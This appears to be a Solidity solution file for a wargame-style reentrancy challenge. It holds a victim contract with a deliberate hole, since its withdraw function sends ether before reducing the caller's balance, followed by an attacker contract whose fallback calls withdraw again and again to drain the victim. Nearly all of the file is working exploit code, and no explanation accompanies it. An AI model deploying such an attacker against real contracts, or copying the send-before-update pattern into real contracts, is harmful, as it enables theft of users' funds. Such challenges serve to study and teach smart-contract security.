// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin/contracts/utils/math/SafeMath.sol';


contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract AttackReentrancy{
    address victim;
     constructor(address payable _victim) public payable {
        victim = _victim;
        
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
        victim.call{value:msg.value}(payload);
    }

    


  function withdraw() public {

     payable(msg.sender).transfer(address(this).balance);
  }

  function withdraw2() public {
     bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 1 wei);
        victim.call(payload);
  }




  fallback () external payable{
        withdraw2();
   }
}


